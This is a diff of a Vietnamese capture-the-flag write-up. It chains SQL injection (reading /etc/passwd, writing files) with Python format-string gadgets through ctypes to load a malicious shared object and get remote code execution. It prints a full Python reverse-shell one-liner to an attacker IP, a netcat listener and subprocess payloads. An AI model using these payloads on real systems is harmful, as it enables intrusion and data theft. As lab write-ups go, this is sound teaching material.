@@ -217,7 +217,6 @@ password :
 ```
 (Dịch ra: x' UNION SELECT 1,EXTRACTVALUE(1,CONCAT(0x7e,LOAD_FILE('/etc/passwd'),0x7e)),3-- -)
 
-
 ![[Attachments/Pasted image 20261119002042.png]]
 
 Ồ, vậy là có đọc file rồi, giờ thì mình thử viết file xem sao nhỉ?
@@ -238,7 +237,7 @@ Quá đã!!! Càng ngày càng gần với Flag rồi!!
 
 Vấn đề đặt ra bây giờ là flag đang được giấu tên file nên mình không thể nào đọc được flag mà không có RCE được (hoặc là do mình chưa nghĩ ra cách nào khác) nên giờ lại phải tìm cách nâng lên RCE 😭
 
-Lúc này nhiều bạn có thể nghĩ đến việc chỉ đơn giản là vẫn dựa vào cái cách bypass lúc nãy để có thể 'leo' để có được lên các hàm nguy hiểm để thực thi mã độc như ý tưởng đã có giống SSTI bằng các payload cực kì sáng tạo kiểu: 
+Lúc này nhiều bạn có thể nghĩ đến việc chỉ đơn giản là vẫn dựa vào gadget Format string để có thể 'leo' để có được lên các hàm nguy hiểm để thực thi mã độc như ý tưởng đã có giống SSTI, bằng các payload cực kì sáng tạo kiểu: 
 ```
 username : { password.__class__.mro()[1].__subclasses__()[396]('echo HIII',shell=True,stdout=-1).communicate()[0].strip() }
 password : abc
@@ -270,7 +269,7 @@ Kết hợp thêm với 2 dữ kiện chúng ta đã có ở trước:
 -  Format string syntax trong str.format_map()
 
 Chúng ta có được RCE bằng cách:
-1) Nạp một file .so độc hại lên server bằng cách ghi file thông qua SQL injection
+1) Nạp một file .so độc hại lên server bằng cách ghi file thông qua SQL injection.
 2) Thực thi file vừa nạp vào thông qua Format string syntax trong str.format_map() qua thư viện ctypes được import vào.
 3) Lúc này mặc dù chỉ gọi được đến thuộc tính` __getattr__` nhưng đủ để chúng ta load được file shared object của mình => Chỉ cần để một đoạn mã tự thực thi khi file .so của chúng ta được load thì chúng ta sẽ exploit thành công.
 
@@ -278,11 +277,12 @@ Chúng ta có được RCE bằng cách:
 
 Mình định thực thi mã trên server và bắt Reverse shell về trên VPS của mình cho tiện. Mình test trên server thì thấy không có nc hay ncat nên mình dùng python:
 Payload mình lấy ở: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#tools
-Bạn có thể dùng công cụ tự động tạo payload ở: https://www.revshells.com/
+Bạn có thể dùng công cụ tự động tạo payload Reverse shell ở: https://www.revshells.com/
 
 ![[Attachments/Pasted image 20261119111924.png]]
 
 Payload mình dùng: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IPv4>",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`
+
 
 Oke, thế là mình sẽ tạo ngay cho bản thân một file .so tự động thự thi mã trên khi được load như sau:
 ```C
@@ -303,7 +303,7 @@ gcc -shared -fPIC -o hello.so hello.c
 
 Chúng ta được file hello.so.
 Sau đó mình dùng script nho nhỏ sau để tạo payload giúp ghi file hello.so lên server :
-(Ở đây mình đổi tên thành hello123.so do mình đã nạp hello.so lên server Docker từ trước, do mình test thì thấy nếu các lần sau nạp lên trùng tên thì sẽ bị cache)
+(Ở đây mình đổi tên thành hello123.so do mình đã nạp hello.so lên server Docker từ trước, bởi mình test thì thấy nếu các lần sau nạp lên trùng tên thì sẽ bị cache)
 ```python
 
 from pathlib import Path
@@ -367,10 +367,9 @@ Nghe reverse shell:
 nc -lvnp 4242
 ```
 
-Sau đó load thư viện này vào bằng cách gửi `{a.__class__.__init__.__globals__[ctypes].cdll['/var/run/mysqld/hello123.so']}{a}`:
-
+Sau đó load thư viện này vào bằng cách gửi `{{a.__class__.__init__.__globals__[ctypes].cdll[/var/run/mysqld/hello2.so]}}{{a}}{a}`
 ```
 username : admin
 password : {{a.__class__.__init__.__globals__[ctypes].cdll[{a.FORBIDDEN_CHARACTERS[7]}var{a.FORBIDDEN_CHARACTERS[7]}run{a.FORBIDDEN_CHARACTERS[7]}mysqld{a.FORBIDDEN_CHARACTERS[7]}hello123.so]}}{{a}}{a}
 ```
-![[Attachments/Pasted image 20261119115026.png]]
+![[Attachments/Pasted image 20261119115026.png]]![[Attachments/Pasted image 20261119115746.png]]
